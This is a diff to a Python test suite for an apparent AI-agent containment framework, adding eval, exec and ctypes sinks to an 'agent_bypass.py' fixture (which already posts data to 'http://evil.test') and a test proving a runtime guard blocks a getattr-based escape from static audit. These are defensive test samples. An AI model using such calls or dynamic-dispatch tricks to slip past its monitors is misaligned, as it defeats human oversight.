@@ -889,7 +889,7 @@ def test_mediation_completeness():
           MA.audit([compliant]))
 
     shapes = w("agent_bypass.py",
-               "import os, socket\n"
+               "import os, socket, ctypes\n"
                "from subprocess import Popen\n"
                "import urllib.request as U\n"
                "import requests\n"
@@ -900,10 +900,14 @@ def test_mediation_completeness():
                "    U.urlopen('http://evil.test')\n"
                "    requests.post('http://evil.test', data='x')\n"
                "    open(p, 'w').write('x')\n"
-               "    os.remove(p)\n")
+               "    os.remove(p)\n"
+               "    eval('1+1')\n"
+               "    exec('y=1')\n"
+               "    ctypes.CDLL('x')\n")
     got = {v["sink"] for v in MA.audit([shapes])}
     for expect in ("os.system", "socket.socket", "subprocess.Popen",
-                   "urllib.request.urlopen", "requests.post", "open(w)", "os.remove"):
+                   "urllib.request.urlopen", "requests.post", "open(w)", "os.remove",
+                   "eval", "exec", "ctypes.CDLL"):
         check(expect in got, f"audit flags {expect} outside the executor", sorted(got))
 
     reads = w("agent_reads.py",
@@ -924,6 +928,22 @@ def test_mediation_completeness():
           "an unparseable agent module fails closed (counts as a violation)", MA.audit([broken]))
 
 
+@invariant("RTG", "the runtime guard blocks a dynamic-dispatch escape the static audit cannot see")
+def test_runtime_guard():
+    import subprocess
+    here = os.path.dirname(os.path.abspath(__file__))
+    # A PEP 578 audit hook is process-global and cannot be removed, so this is proven in a FRESH
+    # interpreter: runtime_guard.py's self-test installs the guard, tries to defeat it by dynamic
+    # dispatch (getattr(os,'system')(...)) which the static audit cannot see, and exits nonzero if
+    # the escape was NOT blocked — or if the same effect was blocked inside a legitimate permit
+    # window, or if a plain read got caught.
+    r = subprocess.run([sys.executable, os.path.join(here, "runtime_guard.py")],
+                       capture_output=True, text=True, timeout=60)
+    check(r.returncode == 0,
+          "runtime_guard self-test passes (dynamic-dispatch effect blocked outside a permit window)",
+          (r.stdout + r.stderr).strip()[:200])
+
+
 TESTS = [test_g2_fail_closed, test_g3_tightening_only, test_g5_no_unreviewable_action,
          test_g6_informed_approval, test_g7_scrutiny_ceiling, test_g8_trajectory,
          test_g9_information_flow, test_g10_no_laundering, test_g11_mesh_budget,
@@ -931,7 +951,7 @@ TESTS = [test_g2_fail_closed, test_g3_tightening_only, test_g5_no_unreviewable_a
          test_g14_dead_mans_switch, test_g15_tamper_evident, test_kernel_end_to_end,
          test_shadow_is_inert, test_enforcement, test_asymmetric_verify_only,
          test_loop_allowlist, test_blind_mode, test_agent_proposal, test_redteam_regressions,
-         test_mediation_completeness]
+         test_mediation_completeness, test_runtime_guard]
 
 
 if __name__ == "__main__":
